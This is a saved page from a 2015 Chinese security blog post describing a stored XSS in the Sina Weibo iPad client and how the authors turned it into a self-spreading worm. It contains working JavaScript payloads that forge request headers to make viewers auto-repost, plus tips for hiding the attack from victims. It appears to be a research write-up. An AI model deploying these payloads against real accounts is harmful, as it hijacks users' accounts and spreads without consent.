@@ -1,0 +1,269 @@
+
+<!DOCTYPE html>
+
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta content="IE=edge" http-equiv="X-UA-Compatible"/>
+<meta content="True" name="HandheldFriendly"/>
+<meta content="width=device-width, initial-scale=1, maximum-scale=1" name="viewport">
+<meta content="phithon的小站，长期存在与分享关于网络安全与各种编程的原创文章。" name="description"/>
+<meta content="网络安全,代码审计,信息安全,漏洞挖掘,php,C++,mysql,python" name="keywords"/>
+<link href="./新浪微博IPAD客户端XSS(file域) + 构造Worm  离别歌/favicon.ico" rel="shortcut icon"/>
+<link href="./新浪微博IPAD客户端XSS(file域) + 构造Worm  离别歌/favicon-192x192.png" rel="icon" sizes="192x192" type="image/png"/>
+<link href="./新浪微博IPAD客户端XSS(file域) + 构造Worm  离别歌/apple-touch-icon.png" rel="apple-touch-icon" sizes="180x180"/>
+<title>新浪微博IPAD客户端XSS(file域) + 构造Worm | 离别歌</title>
+<link href="./新浪微博IPAD客户端XSS(file域) + 构造Worm  离别歌/font-awesome.min.css" rel="stylesheet"/>
+<link href="./新浪微博IPAD客户端XSS(file域) + 构造Worm  离别歌/styles.css" rel="stylesheet"/>
+<link href="./新浪微博IPAD客户端XSS(file域) + 构造Worm  离别歌/style.css" rel="stylesheet"/>
+<link href="./新浪微博IPAD客户端XSS(file域) + 构造Worm  离别歌/flexboxgrid.min.css" rel="stylesheet"/>
+<link href="./新浪微博IPAD客户端XSS(file域) + 构造Worm  离别歌/feed" rel="alternate" title="离别歌" type="application/atom+xml">
+<script src="./新浪微博IPAD客户端XSS(file域) + 构造Worm  离别歌/jquery.min.js"></script>
+<link href="./新浪微博IPAD客户端XSS(file域) + 构造Worm  离别歌/code.css" rel="stylesheet"/>
+<link href="./新浪微博IPAD客户端XSS(file域) + 构造Worm  离别歌/button.css" rel="stylesheet"/>
+<link href="./新浪微博IPAD客户端XSS(file域) + 构造Worm  离别歌/pagination.css" rel="stylesheet"/>
+<link href="./新浪微博IPAD客户端XSS(file域) + 构造Worm  离别歌/jquery.fancybox.min.css" rel="stylesheet"/>
+</link></meta></head>
+<body>
+<div id="header-post">
+<a class="active" href="#" id="menu-icon"><i class="fa fa-bars fa-lg"></i></a>
+<a class="active" href="#" id="menu-icon-tablet"><i class="fa fa-bars fa-lg"></i></a>
+<a href="#" id="top-icon-tablet" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
+<span id="menu" style="visibility: visible">
+<span id="nav">
+<ul>
+<li><a href="/">主页</a></li>
+<li><a href="javascript:history.back(-1)">返回</a></li>
+</ul>
+</span>
+<br/>
+<span id="actions">
+<ul>
+<li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i aria-hidden="true" class="fa fa-chevron-up" onmouseout="$('#i-top').toggle();" onmouseover="$('#i-top').toggle();"></i></a></li>
+<li><a class="icon" href="#"><i aria-hidden="true" class="fa fa-share-alt" onclick="$('#share').toggle();return false;" onmouseout="$('#i-share').toggle();" onmouseover="$('#i-share').toggle();"></i></a></li>
+</ul>
+<span class="info" id="i-top" style="display:none;">Back to top</span>
+<span class="info" id="i-share" style="display:none;">Share post</span>
+</span>
+<br/>
+<div id="share" style="display: none">
+<ul>
+<li><a class="icon" href="http://www.facebook.com/sharer.php?u=https%3A//www.leavesongs.com/PENETRATION/ipad-weibo-store-xss-worm.html"><i aria-hidden="true" class="fa fa-facebook "></i></a></li>
+<li><a class="icon" href="https://twitter.com/share?url=https%3A//www.leavesongs.com/PENETRATION/ipad-weibo-store-xss-worm.html&amp;text=%E6%96%B0%E6%B5%AA%E5%BE%AE%E5%8D%9AIPAD%E5%AE%A2%E6%88%B7%E7%AB%AFXSS%28file%E5%9F%9F%29%20%2B%20%E6%9E%84%E9%80%A0Worm"><i aria-hidden="true" class="fa fa-twitter "></i></a></li>
+<li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3A//www.leavesongs.com/PENETRATION/ipad-weibo-store-xss-worm.html&amp;title=%E6%96%B0%E6%B5%AA%E5%BE%AE%E5%8D%9AIPAD%E5%AE%A2%E6%88%B7%E7%AB%AFXSS%28file%E5%9F%9F%29%20%2B%20%E6%9E%84%E9%80%A0Worm"><i aria-hidden="true" class="fa fa-linkedin "></i></a></li>
+<li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3A//www.leavesongs.com/PENETRATION/ipad-weibo-store-xss-worm.html&amp;is_video=false&amp;description=%E6%96%B0%E6%B5%AA%E5%BE%AE%E5%8D%9AIPAD%E5%AE%A2%E6%88%B7%E7%AB%AFXSS%28file%E5%9F%9F%29%20%2B%20%E6%9E%84%E9%80%A0Worm"><i aria-hidden="true" class="fa fa-pinterest "></i></a></li>
+<li><a class="icon" href="mailto:?subject=%E6%96%B0%E6%B5%AA%E5%BE%AE%E5%8D%9AIPAD%E5%AE%A2%E6%88%B7%E7%AB%AFXSS%28file%E5%9F%9F%29%20%2B%20%E6%9E%84%E9%80%A0Worm&amp;body=Check out this article: https%3A//www.leavesongs.com/PENETRATION/ipad-weibo-store-xss-worm.html"><i aria-hidden="true" class="fa fa-envelope "></i></a></li>
+<li><a class="icon" href="https://getpocket.com/save?url=https%3A//www.leavesongs.com/PENETRATION/ipad-weibo-store-xss-worm.html&amp;title=%E6%96%B0%E6%B5%AA%E5%BE%AE%E5%8D%9AIPAD%E5%AE%A2%E6%88%B7%E7%AB%AFXSS%28file%E5%9F%9F%29%20%2B%20%E6%9E%84%E9%80%A0Worm"><i aria-hidden="true" class="fa fa-get-pocket "></i></a></li>
+<li><a class="icon" href="http://reddit.com/submit?url=https%3A//www.leavesongs.com/PENETRATION/ipad-weibo-store-xss-worm.html&amp;title=%E6%96%B0%E6%B5%AA%E5%BE%AE%E5%8D%9AIPAD%E5%AE%A2%E6%88%B7%E7%AB%AFXSS%28file%E5%9F%9F%29%20%2B%20%E6%9E%84%E9%80%A0Worm"><i aria-hidden="true" class="fa fa-reddit "></i></a></li>
+<li><a class="icon" href="http://www.stumbleupon.com/submit?url=https%3A//www.leavesongs.com/PENETRATION/ipad-weibo-store-xss-worm.html&amp;title=%E6%96%B0%E6%B5%AA%E5%BE%AE%E5%8D%9AIPAD%E5%AE%A2%E6%88%B7%E7%AB%AFXSS%28file%E5%9F%9F%29%20%2B%20%E6%9E%84%E9%80%A0Worm"><i aria-hidden="true" class="fa fa-stumbleupon "></i></a></li>
+<li><a class="icon" href="http://digg.com/submit?url=https%3A//www.leavesongs.com/PENETRATION/ipad-weibo-store-xss-worm.html&amp;title=%E6%96%B0%E6%B5%AA%E5%BE%AE%E5%8D%9AIPAD%E5%AE%A2%E6%88%B7%E7%AB%AFXSS%28file%E5%9F%9F%29%20%2B%20%E6%9E%84%E9%80%A0Worm"><i aria-hidden="true" class="fa fa-digg "></i></a></li>
+<li><a class="icon" href="http://www.tumblr.com/share/link?url=https%3A//www.leavesongs.com/PENETRATION/ipad-weibo-store-xss-worm.html&amp;name=%E6%96%B0%E6%B5%AA%E5%BE%AE%E5%8D%9AIPAD%E5%AE%A2%E6%88%B7%E7%AB%AFXSS%28file%E5%9F%9F%29%20%2B%20%E6%9E%84%E9%80%A0Worm&amp;description="><i aria-hidden="true" class="fa fa-tumblr "></i></a></li>
+</ul>
+</div>
+</span>
+</div>
+<div class="content index width mx-auto px2 my4">
+<article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">
+<header>
+<h1 class="posttitle" itemprop="name headline">新浪微博IPAD客户端XSS(file域) + 构造Worm</h1>
+<div class="meta">
+<span class="author" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+<span itemprop="name">Phithon</span>
+</span>
+<div class="postdate">
+<time datetime="2015年3月12日 23:02" itemprop="datePublished">
+                    2015 三月 12 23:02
+                </time>
+</div>
+<div class="article-tag">
+            阅读：4797
+            </div>
+<div class="article-tag">
+<i class="fa fa-bookmark"></i>
+<a class="tag-link" href="/sort/PENETRATION">网络安全</a>
+</div>
+<div class="article-tag">
+<i class="fa fa-tag"></i>
+<a class="tag-link" href="/tag/%E5%AE%A2%E6%88%B7%E7%AB%AFXSS">客户端XSS</a>,
+                
+                <a class="tag-link" href="/tag/xss%E8%A0%95%E8%99%AB">xss蠕虫</a>
+</div>
+</div>
+</header>
+<div class="content" itemprop="articleBody">
+<p>前两天和izy一起研究了一个他发现的新浪微博XSS，触发位置在微博ipad版中。</p>
+<p>Izy发现，当我们通过第三方APP“快手”，将信息分享到微博时，信息内容就会造成一个XSS。当用户在ipad版微博客户端上查看这条微博的时候，即触发。我们这次的目的就是让这个存储型XSS变成蠕虫。</p>
+<p>首先我下载了快手GIF安卓版（ipad/ios应该也可以），拍一段GIF，分享到微博，分享位置填入我的XSS POC：</p>
+<p><a href="https://www.leavesongs.com/content/uploadfile/201503/29551426172719.png"><img alt="image001.png" src="./新浪微博IPAD客户端XSS(file域) + 构造Worm  离别歌/thum-29551426172719.png"/></a> </p>
+<p>我的POC只是一个弹窗的alert，在ipad上打开微博APP，点击查看我刚发的分享，即可触发：</p>
+<p><a href="https://www.leavesongs.com/content/uploadfile/201503/25ae1426172756.png"><img alt="image003.png" src="./新浪微博IPAD客户端XSS(file域) + 构造Worm  离别歌/thum-25ae1426172756.png"/></a></p>
+<p>我们看到，这个XSS是在本地域（file://）触发的。这就比较有意思了，因为在safari下，本地域是可以跨任意域的。</p>
+<p>比如我跨域请求乌云的首页：</p>
+<p><a href="https://www.leavesongs.com/content/uploadfile/201503/f3c81426172834.png"><img alt="image005.png" src="./新浪微博IPAD客户端XSS(file域) + 构造Worm  离别歌/thum-f3c81426172834.png"/></a></p>
+<p>跨域是什么概念，比如我在这里插入一个XSS，能直接打到你乌云的cookie。当然，只有在你登录了乌云的情况下。</p>
+<p>这就造成了一个很大的问题，我试过即使我在外面的safari浏览器中登录了某个网站，但在APP里也获取不到这个网站的COOKIE。二者不属于一个APP，所以数据是隔离的。</p>
+<p>实际上，谁会在微博的客户端中去登录乌云呢？</p>
+<p>那么，在微博的客户端中，我们登录了哪个网站？当然是weibo.com了，我们用&lt;iframe src=”<a href="http://weibo.com">http://weibo.com</a>”&gt;在客户端中打开微博首页，就能看到我们已经登录了微博：</p>
+<p><a href="https://www.leavesongs.com/content/uploadfile/201503/46071426172906.png"><img alt="image007.png" src="./新浪微博IPAD客户端XSS(file域) + 构造Worm  离别歌/thum-46071426172906.png"/></a></p>
+<p>我再试试以下的payload：</p>
+<div class="codehilite"><pre><span></span><span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="s2">"&lt;iframe name='wooyun' src='http://weibo.com'&gt;"</span><span class="p">);</span>
+<span class="nx">setTimeout</span><span class="p">(</span><span class="kd">function</span><span class="p">(){</span>
+    <span class="nx">alert</span><span class="p">(</span><span class="nx">wooyun</span><span class="p">.</span><span class="nb">window</span><span class="p">.</span><span class="nb">document</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span><span class="p">);</span>
+<span class="p">},</span> <span class="mi">2000</span><span class="p">);</span>
+</pre></div>
+<p>却发现得到的location.href却是about:blank</p>
+<p><a href="https://www.leavesongs.com/content/uploadfile/201503/7dfd1426172963.png"><img alt="image009.png" src="./新浪微博IPAD客户端XSS(file域) + 构造Worm  离别歌/thum-7dfd1426172963.png"/></a></p>
+<p>我们注入的javascript并没有到weibo.com的域下，所以我们不能直接控制weibo.com的内容。但经过抓包发现，虽然不能直接插入javascript，但我们的数据包中却带有自己的cookie。</p>
+<p>新浪的主要cookie是加了HTTPONLY的，偷cookie没有任何意义，但微博作为国内最大的社交媒体之一，一个蠕虫绝对比偷cookie的威力大的多。</p>
+<p>我们来构造蠕虫。对于一个微博，蠕虫最好的方式就是进行转发了，我们抓到了电脑上转发的包：</p>
+<p><a href="https://www.leavesongs.com/content/uploadfile/201503/e1fb1426172938.png"><img alt="image011.png" src="./新浪微博IPAD客户端XSS(file域) + 构造Worm  离别歌/thum-e1fb1426172938.png"/></a></p>
+<p>如上图，抓包之后进行fuzz，发现在HTTP头中，Referer肯定是不能少的（新浪是用Referer来防御CSRF漏洞），X-Requested-With: XMLHttpRequest和Content-Type: application/x-www-form-urlencoded也必须有。</p>
+<p>因为我们可以跨域，所以我们通过ajax来发送POST包，将Referer、X-Requested-With、Content-Type加入header。</p>
+<p>在chrome下，我们是不能通过ajax修改Referer的，但safari却没这么安全的设置。我用到了parsec团队兔子君编写的love.js(<a href="https://quininer.github.io/tests/love.js)来辅助我编写payload">https://quininer.github.io/tests/love.js)来辅助我编写payload</a>：</p>
+<div class="codehilite"><pre><span></span><span class="nx">love</span><span class="p">.</span><span class="nx">req</span><span class="p">.</span><span class="nx">ajax</span><span class="p">(</span><span class="s2">"http://weibo.com/"</span><span class="p">,</span> <span class="s2">"pic_src=&amp;appkey=&amp;mid=3814845696408506&amp;style_type=1&amp;mark=&amp;reason=%E8%BD%AC%E5%8F%91%E5%BE%AE%E5%8D%9A&amp;location=page_100505_home&amp;pdetail=1005055462247711&amp;module=&amp;page_module_id=&amp;refer_sort=&amp;rank=0&amp;rankid=&amp;_t=0"</span><span class="p">,</span> <span class="p">{</span>
+  <span class="s2">"Referer"</span><span class="o">:</span> <span class="s2">"http://weibo.com/"</span><span class="p">,</span>
+  <span class="s2">"X-Requested-With"</span><span class="o">:</span> <span class="s2">"XMLHttpRequest"</span><span class="p">,</span>
+  <span class="s2">"Content-Type"</span><span class="o">:</span> <span class="s2">"application/x-www-form-urlencoded"</span>
+<span class="p">},</span> <span class="kd">function</span><span class="p">(</span><span class="nx">data</span><span class="p">){</span>
+  <span class="nx">alert</span><span class="p">(</span><span class="nx">data</span><span class="p">.</span><span class="nx">target</span><span class="p">.</span><span class="nx">responseText</span><span class="p">);</span>
+<span class="p">});</span>
+</pre></div>
+<p>但是我将这个payload传上去之后却发现，返回的包确是一个未登录的提示：</p>
+<p><a href="https://www.leavesongs.com/content/uploadfile/201503/47c11426172971.png"><img alt="image013.png" src="./新浪微博IPAD客户端XSS(file域) + 构造Worm  离别歌/thum-47c11426172971.png"/></a></p>
+<p>我明明应该有weibo.com的cookie的呀？后来izy发现，原来是因为我长时间（这个测试是第二天做的）不操作，所以cookie已经过期了。只要我们再用iframe加载一次weibo.com，即可重新获得cookie。</p>
+<div class="codehilite"><pre><span></span><span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="s2">"&lt;iframe id=hi src=http://weibo.com &gt;&lt;/iframe&gt;"</span><span class="p">);</span>
+<span class="nx">love</span><span class="p">.</span><span class="nx">req</span><span class="p">.</span><span class="nx">ajax</span><span class="p">(</span><span class="s2">"http://weibo.com/aj/v6/mblog/forward?ajwvr=6&amp;domain=100505&amp;__rnd=1425013147163"</span><span class="p">,</span> <span class="s2">"pic_src=&amp;appkey=&amp;mid=3814845696408506&amp;style_type=1&amp;mark=&amp;reason=%E8%BD%AC%E5%8F%91%E5%BE%AE%E5%8D%9A&amp;location=page_100505_home&amp;pdetail=1005055462247711&amp;module=&amp;page_module_id=&amp;refer_sort=&amp;rank=0&amp;rankid=&amp;_t=0"</span><span class="p">,</span> <span class="p">{</span>
+  <span class="s2">"Referer"</span><span class="o">:</span> <span class="s2">"http://weibo.com/"</span><span class="p">,</span>
+  <span class="s2">"X-Requested-With"</span><span class="o">:</span> <span class="s2">"XMLHttpRequest"</span><span class="p">,</span>
+  <span class="s2">"Content-Type"</span><span class="o">:</span> <span class="s2">"application/x-www-form-urlencoded"</span>
+<span class="p">},</span> <span class="kd">function</span><span class="p">(</span><span class="nx">data</span><span class="p">){</span>
+  <span class="nx">alert</span><span class="p">(</span><span class="nx">data</span><span class="p">.</span><span class="nx">target</span><span class="p">.</span><span class="nx">responseText</span><span class="p">);</span>
+<span class="p">});</span>
+</pre></div>
+<p>触发payload发现返回结果变了，已经成功转发微博（实战中将这个弹窗去掉，并可以将iframe的width和height设置为0，让用户察觉不到自己受到危害）：</p>
+<p><a href="https://www.leavesongs.com/content/uploadfile/201503/4c4f1426173004.png"><img alt="image015.png" src="./新浪微博IPAD客户端XSS(file域) + 构造Worm  离别歌/thum-4c4f1426173004.png"/></a></p>
+<p>查看自己的主页已经看到转发了：</p>
+<p><a href="https://www.leavesongs.com/content/uploadfile/201503/37991426173007.png"><img alt="image017.png" src="./新浪微博IPAD客户端XSS(file域) + 构造Worm  离别歌/thum-37991426173007.png"/></a></p>
+<p>这样就形成了一个新浪微博的蠕虫。只要查看了我这个微博的用户，即会自动转发这条微博。我们甚至可以把“转发微博”那四个字改成@好友，这样传播下去，只要用了ipad版微博客户端的用户都会触发XSS，再次转发，形成一个一传十十传百的效果。</p>
+<p>这篇文章由izy和phithon完成，并再次感谢izy提供了这么好的案例，让我们接触了客户端XSS和客户端蠕虫。</p>
+</div>
+</article>
+<div id="reply-list">
+<h1>评论</h1>
+<div class="row" id="comment-1979">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./新浪微博IPAD客户端XSS(file域) + 构造Worm  离别歌/0488177ea3ddf12631607e5cb5dd05da.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="" target="_blank">马斯特</a>
+<time datetime="2015年3月19日 01:44" itemprop="datePublished">
+                            2015 三月 19 01:44
+                        </time>
+<a href="javascript:reply_to('1979', '马斯特')">回复</a>
+</p>
+<p class="comment-meta">微博关键Cookie不应该是httponly？</p>
+</div>
+</div>
+<div class="child-node">
+<div class="row" id="comment-1980">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./新浪微博IPAD客户端XSS(file域) + 构造Worm  离别歌/c4267eb6d17276fa31c547ac71611e90.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="http://www.leavesongs.com/" target="_blank">phithon</a>
+<time datetime="2015年3月19日 01:48" itemprop="datePublished">
+                            2015 三月 19 01:48
+                        </time>
+<a href="javascript:reply_to('1980', 'phithon')">回复</a>
+</p>
+<p class="comment-meta">@马斯特：我这里又没使用js获取cookie，httponly对我没任何影响。你没弄懂httponly究竟限制了什么。</p>
+</div>
+</div>
+</div>
+<div class="row" id="comment-1970">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./新浪微博IPAD客户端XSS(file域) + 构造Worm  离别歌/6642e85a4512f7c7fc04bef93a9b751c.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="http://ipv6.sonyis.science" target="_blank">Silent</a>
+<time datetime="2015年3月14日 17:59" itemprop="datePublished">
+                            2015 三月 14 17:59
+                        </time>
+<a href="javascript:reply_to('1970', 'Silent')">回复</a>
+</p>
+<p class="comment-meta">路过膜拜时雨牛</p>
+</div>
+</div>
+</div>
+<form action="#reply" enctype="multipart/form-data" id="reply" method="post">
+<textarea cols="40" id="id_content" name="content" required="" rows="6">
+</textarea>
+<div class="row">
+<div class="col-xs-4">
+<input id="id_nickname" maxlength="64" name="nickname" placeholder="昵称" required="" type="text"/>
+</div>
+<div class="col-xs-4">
+<input id="id_email" maxlength="254" name="email" placeholder="邮箱（可留空）" type="text"/>
+</div>
+<div class="col-xs-4">
+<input id="id_url" maxlength="200" name="url" placeholder="链接（可留空）" type="text"/>
+</div>
+</div>
+<div class="row" style="margin-top: 8px"><div class="col-xs-4"><input autocomplete="off" id="id_captcha_1" name="captcha_1" placeholder="验证码" type="text"/> <input id="id_captcha_0" name="captcha_0" type="hidden" value="28d0b7ab578c885c30775b9690bdfbbc7834a260"/>
+</div><div class="col-xs-4">
+<img alt="captcha" class="captcha" height="25" src="./新浪微博IPAD客户端XSS(file域) + 构造Worm  离别歌/28d0b7ab578c885c30775b9690bdfbbc7834a260"/></div></div>
+<div class="clearfix"></div>
+<input class="ui-button ui-button-sgreen" type="submit" value="提交"/>
+<input id="id_archive" name="archive" type="hidden" value="349">
+<input id="id_parent" name="parent" type="hidden"/>
+<input name="csrfmiddlewaretoken" type="hidden" value="Ay0EIHSgBzxCOMnIMQKjX5AOlaxIwcap8Slawb4v2mr1OrLXA7e3wJCTue0QfGZz"/>
+</input></form>
+</div>
+<footer id="footer">
+<div class="footer-left">
+    Copyright © 2017 Powered by talkbook
+  </div>
+<div class="footer-right">
+<nav>
+<ul>
+<li><a href="/">首页</a></li>
+<li><a href="http://weibo.com/101yx" target="_blank">微博</a></li>
+<li><a href="https://github.com/phith0n" target="_blank">项目</a></li>
+<li><a href="/template/change/">更换模板</a></li>
+</ul>
+</nav>
+</div>
+</footer>
+<script src="./新浪微博IPAD客户端XSS(file域) + 构造Worm  离别歌/main.js"></script>
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?ad9ab5e37c2811b9f0979e46123fc898";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+<script src="./新浪微博IPAD客户端XSS(file域) + 构造Worm  离别歌/jquery.fancybox.pack.js"></script>
+<script>
+$(document).ready(function () {
+    $("article a").each(function (i, e) {
+        if(e.host != 'www.leavesongs.com') {
+            e.target = '_blank';
+        }
+    });
+    $("article img").each(function (i, e) {
+        if(e.parentNode.tagName.toUpperCase() != 'A') {
+            $(e).wrap('<a href="'+escapeHtml(e.src)+'" class="fancybox"></a>');
+        } else {
+            $(e.parentNode).addClass('fancybox');
+        }
+    });
+    $('.fancybox').fancybox();
+})
+</script>
+</body>
+</html>
